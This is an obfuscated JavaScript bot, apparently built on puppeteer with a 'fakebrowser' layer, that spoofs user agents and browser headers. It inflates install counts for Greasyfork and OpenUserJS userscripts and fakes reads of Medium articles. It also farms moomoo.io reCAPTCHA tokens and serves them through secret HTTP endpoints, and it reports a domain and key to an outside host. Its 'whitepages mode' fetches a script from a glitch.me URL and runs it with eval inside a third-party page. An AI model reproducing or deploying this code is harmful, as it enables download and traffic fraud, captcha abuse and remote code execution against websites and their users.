      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + W(0x16) + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + Y(0x5, 'PfOl') + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + X(0x12) + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0xbb * -0x1 + 0x1 * -0x269 + 0x324
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Z = d;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x11c5 + -0xde5 * -0x1 + 0xc1 * -0x2a)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j[Z(0xd)]();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x19cc + 0x9 * -0x70 + 0x1e20), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x2271 + 0x2566 + 0x17d1 * -0x3), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x3 * -0xa97 + -0x1 * 0x283 + -0x1d42;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x7 * 0x164 + 0xd54 + 0x8 * -0x73; w < getRandomInt(-0x22f4 + -0x10 * 0xe9 + -0x1 * -0x3185, -0x351 + 0x253 * 0xd + 0x1 * -0x1ae1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x10d * 0xc2 + -0x238 * 0xc5 + 0x1d39e);
        }
      }();
    }, 0x9f5 * -0x1 + 0x5f6 + 0x463), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x346 + -0x5 * 0x87 + 0xa3 * -0x1;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x48f * -0x1 + -0x26 * 0x17 + -0x7f9 * -0x1, -0x1 * 0x20e3 + -0x267f + 0x4794 * 0x1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x1eb1 * -0x1 + 0x6dd6 + 0x1 * 0x260b);
    }, -0xac3 + 0x226 + 0x901), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x11b1 + 0x4d9 + -0x168a;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x83 + -0x93 * 0x12 + 0x158b), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x79 * 0x49 + 0x1 * 0xb1 + -0x2332), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x16 * -0x9689 + -0xe3432 * 0x1 + 0x538 * 0x7d5);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x15d4 + 0xfad + -0xc5f * 0x3);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1 * 0x18ea + 0x19b + -0x1817 * -0x1);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0xba7 + 0x1f3 * -0x5 + -0x1a7b * -0x2);
}
doFlags['doOUJS'] && ((async () => {
  const bk = {
      f: 0x19
    },
    a4 = c,
    a3 = d,
    a2 = b;
  async function f() {
    const a1 = b,
      a0 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0xdb9 * -0x1 + 0xd1c + -0x1ad4) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1 * -0xaa3 + -0x1 * -0x1ea1 + -0x7 * 0x5e5));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x18fb + -0x1 * -0x1c2d + -0x3528, D['indexOf']('\x20'));
        return B ? E['slice'](-0x43 + 0x1f52 + -0x1f0f, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0xf77 + -0x17a5 * 0x1 + 0x1 * 0x2f3e),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + a0(0x6) + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x12d3 + 0xc28 + -0x1 * -0x815),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + a1(0xa, '^(([') + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      a2(0x1d, 'vCHO') + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + a3(0x7) + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + a3(bk.f) + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + a4(0x17) + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + a4(0xc) + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
